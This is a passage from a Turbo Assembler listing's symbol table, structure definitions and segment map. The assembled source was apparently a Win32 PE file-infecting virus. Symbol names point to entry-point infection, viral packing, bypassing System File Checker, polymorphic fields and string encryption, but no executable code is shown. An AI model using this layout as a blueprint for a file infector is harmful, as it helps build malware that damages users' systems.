_GLOBALFREE			  Dword	 FLAT:2EB4
_IMAGE_NT_HEADERS		  Dword	 FLAT:0164
_IMPORT_FUNCTION		  Dword	 FLAT:01B8
_IMPORT_GETKERNEL		  Number FLAT:29D2
_IMPORT_GETPROCADDRESS		  Number FLAT:2AEC
_INFECT				  Near32 FLAT:0476
_INFECT_BIGGEST_RVA		  Dword	 FLAT:0184
_INFECT_COMPRESS_ADDR_1		  Dword	 FLAT:019C
_INFECT_COMPRESS_SPACE_1	  Dword	 FLAT:0194
_INFECT_COMPRESS_SPACE_2	  Dword	 FLAT:0198
_INFECT_END			  Near32 FLAT:0EE0
_INFECT_END_1			  Near32 FLAT:0ED5
_INFECT_END_2			  Near32 FLAT:0ECA
_INFECT_END_3			  Near32 FLAT:0EBF
_INFECT_END_4			  Near32 FLAT:0EB2
_INFECT_ENTRY_POINT		  Dword	 FLAT:0168
_INFECT_EP_SECTION		  Dword	 FLAT:016C
_INFECT_EXPORT_DIR_RVA		  Dword	 FLAT:0170
_INFECT_EXPORT_DIR_VA		  Dword	 FLAT:017C
_INFECT_EXPORT_NAMES		  Dword	 FLAT:0180
_INFECT_EXPORT_SZ		  Dword	 FLAT:0178
_INFECT_FLECHAL_RVA		  Dword	 FLAT:018C
_INFECT_IMPORT_DIR_RVA		  Dword	 FLAT:0174
_INFECT_LAST_SECTION		  Dword	 FLAT:0188
_INFECT_LIB_RVA			  Dword	 FLAT:0190
_INFECT_MODE_1			  Number FLAT:2B34
_INFECT_ORIG_BYTES		  Byte	 FLAT:2C35
_INFECT_VIRTUAL_RAW		  Dword	 FLAT:01A0
_INSTALL			  Near32 FLAT:015B
_IO_END				  Near32 FLAT:1272
_KERNEL_IMPORT_VA		  Dword	 FLAT:01B4
_LOADER_ENTRY_POINT		  Near32 FLAT:2D7F
_LOADER_FIXED_RANDOM_VALUE	  Number FLAT:2DF7
_LOADER_MEMORY_PROTECT?		  Number FLAT:2D91
_LOADER_MEMORY_PROTECT?_DIF	  Number FLAT:2DA6
_LOADER_SECTION_SRC		  Near32 FLAT:2D8F
_LOOK_4_FUNCTION		  Dword	 FLAT:01B0
_MAP				  Near32 FLAT:1229
_MAP_ACCESS_TYPE		  Dword	 FLAT:0140
_MEM_TOTAL			  Number FLAT:2C08
_MODE_LOADER_0			  Near32 FLAT:2C0C
_MODE_LOADER_2			  Near32 FLAT:2C82
_MVIEW_ACCESS_TYPE		  Dword	 FLAT:0144
_NO_EXPORT			  Near32 FLAT:0C7B
_NO_SFC				  Near32 FLAT:06F9
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 118
Symbol Table



_OPEN				  Near32 FLAT:1183
_OPENMUTEX			  Near32 FLAT:044C
_OPENMUTEXA			  Dword	 FLAT:2E9C
_OPEN_CREATE			  Near32 FLAT:112A
_OPEN_READ			  Near32 FLAT:10F9
_OPEN_WRITE			  Near32 FLAT:1154
_OUT_TMAPI			  Near32 FLAT:0447
_POLY_FIELDS			  Near32 FLAT:0F1D
_PROTECT?			  Near32 FLAT:2D57
_REG				  Number 44414F4C
_REPLACED_API_SECTION		  Number FLAT:2D89
_REPLACED_API_SECTION_SRC	  Near32 FLAT:2D87
_REPLACED_API_SECTION_SZ	  Number FLAT:2C18
_RE_ALIGN			  Near32 FLAT:109B
_RE_SIZE			  Near32 FLAT:1080
_RVA_LOOP			  Near32 FLAT:10D1
_RVA_LOOP_1			  Near32 FLAT:10D9
_RVA_TO_VA			  Near32 FLAT:1060
_SEARCH_END			  Near32 FLAT:03FC
_SEARCH_VIA_TMAPI		  Near32 FLAT:03DE
_SECTION_SIZE			  Dword	 FLAT:2D7B
_SET_NORMAL			  Near32 FLAT:11B7
_SFC_FLAG			  Number FLAT:06FC
_START				  Near32 FLAT:0000
_UNLOADTMAPI			  Near32 FLAT:043C
_UNLOAD_SFC			  Near32 FLAT:06EE
_UNPACK_TO_DISK			  Near32 FLAT:2DAE
_UNPACK_TO_DISK_ERROR		  Near32 FLAT:2E85
_UNPACK_TO_DISK_ERROR_1		  Near32 FLAT:2E7E
_VALID_ENTRY_POINT		  Near32 FLAT:0ABF
_VIRAL_PACK_PACKET_ADDR		  Byte	 FLAT:01C0
_VIRAL_PACK_PACKET_SZ		  Dword	 FLAT:01BC
_VIRAL_TEMP_BUFFER_1		  Byte	 FLAT:61C4
_VIRAL_TEMP_SZ			  Dword	 FLAT:61C0
_VIRTUALPROTECT			  Dword	 FLAT:2E98
_WRITEFILE			  Dword	 FLAT:2E90
_XSIZE				  Number 000C
__ENTRY				  Number FLAT:2D81
__INSTALL			  Near32 FLAT:0155
__START_LOADER_RUNTIME		  Dword	 FLAT:2D96

Macro Name

CALLX
CRASH
ESP_CRYPT
STOSD_CRYPT
STRING_DECRYPT
X_NOT
X_POP
X_PUSH
X_PUSH_FIRST
X_PUSH_NEXT
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 119
Symbol Table




Structure Name			  Type	Offset

FILETIME
 DWLOWDATETIME			  Dword	 0000
 DWHIGHDATETIME			  Dword	 0004
IMAGE_DATA_DIRECTORY
 VIRTUALADDRESS			  Dword	 0000
 ISIZE				  Dword	 0004
IMAGE_EXPORT_DIRECTORY
 _CHARACTERISTICS		  Dword	 0000
 TIMEDATESTAMP			  Dword	 0004
 MAJORVERSION			  Word	 0008
 MINORVERSION			  Word	 000A
 NNAME				  Dword	 000C
 NBASE				  Dword	 0010
 NUMBEROFFUNCTIONS		  Dword	 0014
 NUMBEROFNAMES			  Dword	 0018
 ADDRESSOFFUNCTIONS		  Dword	 001C
 ADDRESSOFNAMES			  Dword	 0020
 ADDRESSOFNAMEORDINALS		  Dword	 0024
IMAGE_FILE_HEADER
 MACHINE			  Word	 0000
 NUMBEROFSECTIONS		  Word	 0002
 TIMEDATESTAMP			  Dword	 0004
 POINTERTOSYMBOLTABLE		  Dword	 0008
 NUMBEROFSYMBOLS		  Dword	 000C
 SIZEOFOPTIONALHEADER		  Word	 0010
 CHARACTERISTICS		  Word	 0012
IMAGE_IMPORT_DESCRIPTOR
 ORIGINALFIRSTTHUNK		  Dword	 0000
 TIMEDATESTAMP			  Dword	 0004
 FORWARDERCHAIN			  Dword	 0008
 NAME1				  Dword	 000C
 FIRSTTHUNK			  Dword	 0010
IMAGE_NT_HEADERS
 SIGNATURE			  Dword	 0000
 FILEHEADER			  Struct 0004 IMAGE_FILE_HEADER
 OPTIONALHEADER			  Struct 0018 IMAGE_OPTIONAL_HEADER32
IMAGE_OPTIONAL_HEADER32
 MAGIC				  Word	 0000
 MAJORLINKERVERSION		  Byte	 0002
 MINORLINKERVERSION		  Byte	 0003
 SIZEOFCODE			  Dword	 0004
 SIZEOFINITIALIZEDDATA		  Dword	 0008
 SIZEOFUNINITIALIZEDDATA	  Dword	 000C
 ADDRESSOFENTRYPOINT		  Dword	 0010
 BASEOFCODE			  Dword	 0014
 BASEOFDATA			  Dword	 0018
 IMAGEBASE			  Dword	 001C
 SECTIONALIGNMENT		  Dword	 0020
 FILEALIGNMENT			  Dword	 0024
 MAJOROPERATINGSYSTEMVERSION	  Word	 0028
 MINOROPERATINGSYSTEMVERSION	  Word	 002A
 MAJORIMAGEVERSION		  Word	 002C
 MINORIMAGEVERSION		  Word	 002E
 MAJORSUBSYSTEMVERSION		  Word	 0030
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 120
Symbol Table



 MINORSUBSYSTEMVERSION		  Word	 0032
 WIN32VERSIONVALUE		  Dword	 0034
 SIZEOFIMAGE			  Dword	 0038
 SIZEOFHEADERS			  Dword	 003C
 CHECKSUM			  Dword	 0040
 SUBSYSTEM			  Word	 0044
 DLLCHARACTERISTICS		  Word	 0046
 SIZEOFSTACKRESERVE		  Dword	 0048
 SIZEOFSTACKCOMMIT		  Dword	 004C
 SIZEOFHEAPRESERVE		  Dword	 0050
 SIZEOFHEAPCOMMIT		  Dword	 0054
 LOADERFLAGS			  Dword	 0058
 NUMBEROFRVAANDSIZES		  Dword	 005C
 DATADIRECTORY			  Struct 0060 IMAGE_DATA_DIRECTORY
IMAGE_SECTION_HEADER
 SH_NAME			  Byte	 0000
 SH_VIRTUALSIZE			  Dword	 0008
 SH_VIRTUALADDRESS		  Dword	 000C
 SH_SIZEOFRAWDATA		  Dword	 0010
 SH_POINTERTORAWDATA		  Dword	 0014
 SH_POINTERTORELOCATIONS	  Dword	 0018
 SH_POINTERTOLINENUMBERS	  Dword	 001C
 SH_NUMBEROFRELOCATIONS		  Word	 0020
 SH_NUMBEROFLINENUMBERS		  Word	 0022
 SH_CHARACTERISTICS		  Dword	 0024

Groups & Segments		  Bit Size Align  Combine Class

DGROUP				  Group
  _BSS				  32  000AC5F8 Dword  Public  BSS
  _DATA				  32  0000 Dword  Public  DATA
FLAT				  Group
_TEXT				  32  2FC0 Dword  Public  CODE
